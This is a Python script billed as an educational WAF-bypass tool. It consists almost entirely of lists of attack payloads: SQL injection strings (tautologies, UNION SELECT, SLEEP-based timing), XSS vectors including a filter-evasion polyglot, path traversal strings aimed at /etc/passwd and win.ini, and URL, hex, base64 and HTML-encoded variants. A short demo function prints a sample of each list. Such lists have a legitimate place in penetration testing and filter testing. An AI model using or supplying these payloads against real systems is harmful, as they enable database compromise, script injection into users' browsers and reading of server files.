#!/usr/bin/env python3
"""
WAF Bypass Payloads - Educational Tool
Collection of WAF bypass techniques
"""

class WAFBypass:
    def __init__(self):
        self.payloads = {
            'SQL Injection': self.get_sqli_payloads(),
            'XSS': self.get_xss_payloads(),
            'Path Traversal': self.get_path_payloads(),
            'Encoded': self.get_encoded_payloads()
        }
    
    def get_sqli_payloads(self):
        """SQL Injection bypass payloads"""
        return [
            # Classic bypass
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "' OR 1=1#",
            
            # Case bypass
            "' Or '1'='1",
            "' oR '1'='1",
            "' OR '1'='1' /*",
            
            # Comment bypass
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1' /*!*/",
            
            # Null byte bypass
            "' OR '1'='1'%00",
            
            # Hex encoding
            "' OR 0x3131=0x3131--",
            "' OR 49=49--",
            
            # Concat bypass
            "' OR '1'='1' AND 'a'='a",
            "' || '1'='1",
            
            # White space bypass
            "'OR'1'='1",
            "'OR/**/1=1--",
            "'OR%0A1=1--",
            
            # Function bypass
            "' OR BENCHMARK(1000000,MD5('a'))--",
            "' OR SLEEP(5)--",
            
            # Advanced bypass
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT 1,2,3--",
            "'/*!50000UNION*/ SELECT 1,2,3--"
        ]
    
    def get_xss_payloads(self):
        """XSS bypass payloads"""
        return [
            # Basic bypass
            "<script>alert(1)</script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            
            # Case bypass
            "<ScRiPt>alert(1)</ScRiPt>",
            
            # Tag bypass
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            
            # Attribute bypass
            "\" onmouseover=\"alert(1)\"",
            "' onfocus='alert(1)'",
            
            # Encoding bypass
            "&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert(1)&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            
            # Event handler bypass
            "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
            
            # Polyglot bypass
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
            
            # CSS bypass
            "<style>@import'javascript:alert(1)';</style>",
            
            # Iframe bypass
            "<iframe src=\"javascript:alert(1)\"></iframe>"
        ]
    
    def get_path_payloads(self):
        """Path Traversal bypass payloads"""
        return [
            # Basic traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            
            # Encoded traversal
            "%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            
            # Double encoding
            "%25%32%65%25%32%65%25%32%66etc%25%32%66passwd",
            
            # Unicode bypass
            "..%c0%afetc%c0%afpasswd",
            "..%c1%9cetc%c1%9cpasswd",
            
            # Null byte bypass
            "../../../etc/passwd%00.jpg",
            
            # Long path bypass
            "....//....//....//etc/passwd",
            
            # Absolute path
            "/etc/passwd",
            "C:\\windows\\win.ini",
            
            # Bypass filters
            "..././..././..././etc/passwd",
            "..;/..;/etc/passwd"
        ]
    
    def get_encoded_payloads(self):
        """Encoded bypass payloads"""
        return [
            # URL encoding
            "%27%20OR%20%271%27%3D%271",
            "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
            
            # Double URL encoding
            "%2527%2520OR%2520%25271%2527%253D%25271",
            
            # Hex encoding
            "0x27204f52202731273d2731",
            
            # Base64 encoding
            "JyBPUiAnMSc9JzE=",
            
            # HTML encoding
            "&#x27;&#x20;&#x4F;&#x52;&#x20;&#x27;&#x31;&#x27;&#x3D;&#x27;&#x31;",
            
            # Mixed encoding
            "%27%20OR%20&#x27;&#x31;&#x27;&#x3D;&#x27;&#x31;"
        ]
    
    def get_all_payloads(self):
        """Get all payloads"""
        all_payloads = []
        for category, payloads in self.payloads.items():
            all_payloads.extend(payloads)
        return all_payloads
    
    def demonstrate(self):
        """Demonstrate WAF bypass techniques"""
        print("="*70)
        print("🛡️ WAF BYPASS TECHNIQUES - Educational Demo")
        print("="*70)
        
        for category, payloads in self.payloads.items():
            print(f"\n📌 {category} ({len(payloads)} payloads)")
            print("-"*50)
            for i, payload in enumerate(payloads[:3], 1):  # Show first 3
                print(f"  {i}. {payload[:50]}...")

def main():
    bypass = WAFBypass()
    bypass.demonstrate()
    
    print("\n" + "="*70)
    print("✅ Total Payloads:", len(bypass.get_all_payloads()))
    print("="*70)

if __name__ == "__main__":
    main()